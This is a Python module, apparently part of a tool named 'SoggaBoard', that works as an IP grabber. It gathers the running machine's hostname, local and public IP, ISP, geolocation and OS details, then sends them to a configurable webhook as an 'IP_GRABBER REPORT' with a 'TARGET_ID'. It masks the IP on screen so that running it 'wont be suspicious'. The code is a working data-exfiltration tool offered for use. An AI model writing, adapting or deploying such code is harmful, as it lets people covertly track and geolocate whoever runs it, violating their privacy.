import socket
import requests
import platform
from datetime import datetime

# --- CONFIG ---
# Replace this with your actual Webhook URL
WEBHOOK_URL = "URL_HERE"

def run():
    print("\n\033[94m[*] INITIALIZING SECURE IP LOGGING...\033[0m")
    
    # 1. Gather Intel
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    os_info = f"{platform.system()} {platform.release()}"
    
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        public_ip = requests.get('https://api.ipify.org', headers=headers, timeout=5).text
        
        geo = requests.get(f'http://ip-api.com/json/{public_ip}', timeout=5).json()
        isp = geo.get('isp', 'Unknown ISP')
        location = f"{geo.get('city')}, {geo.get('country')}"
    except:
        public_ip = "FAILED_TO_RETRIEVE"
        isp = "N/A"
        location = "N/A"
    # Masked IP so if you run this in public it wont be suspicious, even tho there really isn't a point but idk what you use it on sooo.
    masked_ip = public_ip[:7] + "xx.xx.xx"
    print(f" [>] TARGET_ID: {hostname}")
    print(f" [>] PUBLIC_IP: {masked_ip}")
    print(f" [>] STATUS: LOGGING TO SECURE ENDPOINT...")

    # Embed
    embed = {
        "title": "🔱 SoggaBoard // IP_GRABBER REPORT",
        "description": f"New connection log generated at `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`",
        "color": 5763719,  # Neon Green
        "fields": [
            {"name": "💻 Hostname", "value": f"`{hostname}`", "inline": True},
            {"name": "🏠 Local IP", "value": f"`{local_ip}`", "inline": True},
            {"name": "🌐 Public IP", "value": f"**{public_ip}**", "inline": False},
            {"name": "📡 ISP", "value": f"`{isp}`", "inline": True},
            {"name": "📍 Location", "value": f"`{location}`", "inline": True},
            {"name": "🛠️ System", "value": f"`{os_info}`", "inline": False}
        ],
        "footer": {"text": "SoggaBoard v2.7 | Secure Intelligence Log"}
    }

    if "URL_HERE" in WEBHOOK_URL:
        print("\n\033[91m[!] ERR: Webhook URL not configured in ip_grabber.py\033[0m")
    else:
        try:
            response = requests.post(WEBHOOK_URL, json={"embeds": [embed]})
            if response.status_code == 204:
                print("\033[92m[+] SUCCESS: Data transmitted to Webhook.\033[0m")
            else:
                print(f"\033[91m[-] ERR: Server responded with {response.status_code}\033[0m")
        except Exception as e:
            print(f"\033[91m[-] ERR: Transmission failed: {e}\033[0m")

    input("\n[!] Press Enter to return to menu...")
